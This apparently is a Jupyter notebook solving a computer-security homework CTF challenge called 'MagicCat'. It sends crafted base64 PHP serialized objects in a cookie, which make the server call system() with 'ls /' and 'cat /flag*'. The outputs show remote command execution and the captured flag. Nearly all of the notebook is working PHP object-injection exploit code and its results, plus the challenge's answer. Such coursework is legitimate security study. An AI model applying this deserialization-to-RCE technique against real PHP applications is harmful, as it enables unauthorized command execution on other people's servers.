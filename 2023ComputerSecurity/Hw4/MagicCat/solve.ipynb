{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Unserialize...\\nCat Wakeup!\\nbin\\nboot\\ndev\\netc\\nflag_23907376917516c8\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsrv\\nsys\\ntmp\\nusr\\nvar\\n<pre>\\nThis is your 🐱:\\nobject(Cat)#1 (2) {\\n  [\"magic\"]=>\\n  object(Caster)#2 (1) {\\n    [\"cast_func\"]=>\\n    string(6) \"system\"\\n  }\\n  [\"spell\"]=>\\n  string(4) \"ls /\"\\n}\\n</pre>\\n\\n<p>Usage:</p>\\n<p>/?source</p>\\n<p>/?spell=the-spell-of-your-cat</p>\\n\\n'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# ' $(ls /) '\n",
    "cookies={\"cat\": \"TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjQ6ImxzIC8iO30=\"}\n",
    "\n",
    "requests.get(\"http://h4ck3r.quest:8602/\", cookies=cookies).text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Unserialize...\\nCat Wakeup!\\nFLAG{magic_cat_pwnpwn}<pre>\\nThis is your 🐱:\\nobject(Cat)#1 (2) {\\n  [\"magic\"]=>\\n  object(Caster)#2 (1) {\\n    [\"cast_func\"]=>\\n    string(6) \"system\"\\n  }\\n  [\"spell\"]=>\\n  string(10) \"cat /flag*\"\\n}\\n</pre>\\n\\n<p>Usage:</p>\\n<p>/?source</p>\\n<p>/?spell=the-spell-of-your-cat</p>\\n\\n'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# ' $(cat /flag*) '\n",
    "cookies={\"cat\": \"TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9\"}\n",
    "\n",
    "requests.get(\"http://h4ck3r.quest:8602/\", cookies=cookies).text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
